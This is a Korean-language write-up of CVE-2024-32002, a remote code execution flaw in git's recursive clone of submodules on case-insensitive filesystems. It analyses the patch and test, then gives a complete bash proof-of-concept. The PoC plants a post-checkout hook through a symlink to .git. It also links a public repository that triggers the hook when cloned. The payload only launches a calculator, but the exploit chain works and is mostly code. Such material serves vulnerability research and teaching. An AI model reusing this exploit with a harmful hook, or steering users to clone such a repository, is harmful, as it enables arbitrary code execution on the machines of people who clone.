# git clone을 통한 Remote Code Execution 공격 (CVE-2024-32002)

<strong>기여자</strong>
<br/>

-   [이정우@Roronoawjd](https://github.com/Roronoawjd)

## 배경 설명
해당 취약점은 대소문자를 구분하지 않는 Windows, MacOS와 같은 파일 시스템에서 submodule을 포함하는 git 저장소를 clone할 때 발생하는 `RCE(Remote Code Execution)` 취약점이다. RCE는 원격 코드 실행 취약점으로 공격자가 대상 시스템에서 원하는 명령어를 실행할 수 있는 아주 치명적인 취약점이다.
`A/modules/x` 과 `a/modules/x`은 동일한 경로로 취급된다. 이러한 특징과 심볼릭 링크를 활용하여 취약점을 유발한다.

## 취약점 정보
- 해당 POC는 Windows와 MAC 시스템에서만 동작합니다.
- `git config --global core.symlinks false`로 설정된 경우에는 공격이 작동하지 않습니다.


## 취약점 분석
[취약점 패치 확인](https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d)

### `builtin/submodule--helper.c`
dir_contains_only_dotgit 함수: 디렉터리에 .git 파일만 포함되어 있는지 다른 디렉터리도 포함되어 있는지 확인하고 다른 파일이나 디렉터리가 있으면 오류를 반환한다.
clone_submodule 함수: clone하기 전에 하위 모듈 디렉토리가 존재하고 비어있는지 확인한다.

### `t/t7406-submodule-update.sh`

### 1. Global 구성
```sh
test_config_global protocol.file.allow always &&
test_config_global core.symlinks true &&
tell_tale_path="$PWD/tell.tale" &&
```
해당 스크립트는 Git 구성 옵션을 설정한다. protocol.file.allow always를 통해 Git의 파일 프로토콜을 활성화 한다.

core.symlinks true를 설정하여 심볼릭 링크 사용을 허용한다.

tell_tale_path는 RCE가 제대로 잘 작동됬는지 확인하는데 사용한다.

### 2. hook 설정
```sh
git init hook &&
(
  cd hook &&
  mkdir -p y/hooks &&
  write_script y/hooks/post-checkout <<-EOF &&
  echo HOOK-RUN >&2
  echo hook-run >"$tell_tale_path"
  EOF
  git add y/hooks/post-checkout &&
  test_tick &&
  git commit -m post-checkout
) &&
```
- hook 레퍼지토리를 초기화 한다.
- post-checkout이라는 hook을 생성
- hook 스크립트를 저장소에 커밋

### 3. 메인 저장소 설정
```sh
hook_repo_path="$(pwd)/hook" &&
git init captain &&
(
  cd captain &&
  git submodule add --name x/y "$hook_repo_path" A/modules/x &&
  test_tick &&
  git commit -m add-submodule &&
  printf .git >dotgit.txt &&
  git hash-object -w --stdin <dotgit.txt >dot-git.hash &&
  printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info &&
  git update-index --index-info <index.info &&
  test_tick &&
  git commit -m add-symlink
) &&
```
- hook의 경로 저장
- captin이라는 다른 레퍼지토리 초기화
- hook 저장소를 `A/modules/x`에 하위모듈로 추가한 후 커밋
- .git을 가리키는 a라는 심볼릭링크 생성

### 4. 테스트
```sh
test_path_is_missing "$tell_tale_path" &&
test_must_fail git clone --recursive captain hooked 2>err &&
grep "directory not empty" err &&
test_path_is_missing "$tell_tale_path"
```
- RCE가 작동됐는지 확인

### POC 제작
```sh
#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# optional, but I added it to avoid the warning message
git config --global init.defaultBranch main 


# Define the tell-tale path
tell_tale_path="$PWD/tell.tale"

# Initialize the hook repository
git init hook
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
echo "I'm roronoa" > /tmp/pwnd
calc.exe
open -a Calculator.app
EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# Define the hook repository path
hook_repo_path="$(pwd)/hook"

# Initialize the captain repository
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked
```

git은 특정 이벤트가 생겼을 때 자동으로 스크립트를 실행할 수 있도록하는 hook이라는 것이 존재한다. 위치는 .git/hooks 디렉토리에 존재한다.
post-checkout은 checkout한 후에 실행되는 스크립트이다.

![image](https://github.com/Roronoawjd/git_rce/assets/105417063/95806f9f-1f69-46df-a71e-ac6bf97b318b)

순서는 다음과 같다.
1. clone 저장소 git_rce에 `.git`을 가리키는 심볼릭 링크 `a`가 생성
2. git clone할 때 하위 모듈의 경로가 `A/modules/x`가 아니라 `a/modules/x`로 인식됨
3. `a`는 `.git`을 가리키기 때문에 `.git`에 `/modules/x`가 생기고 `y/hooks/post-checkout`이 생성됨
4. checkout 성공 후 자동 후 `git_rce/.git/modules/x/y/hooks/post-checkout`가 실행되어 RCE가 발생함

## POC(Proof of Concept)
⚠️경고: 해당 취약점을 악의적으로 사용하지 마시오!
<pre><code>git clone --recursive https://github.com/Roronoawjd/git_rce.git</code></pre>
참고: Windows에서는 관리자 권한으로 cmd나 bash쉘을 열어서 실행해야 합니다.

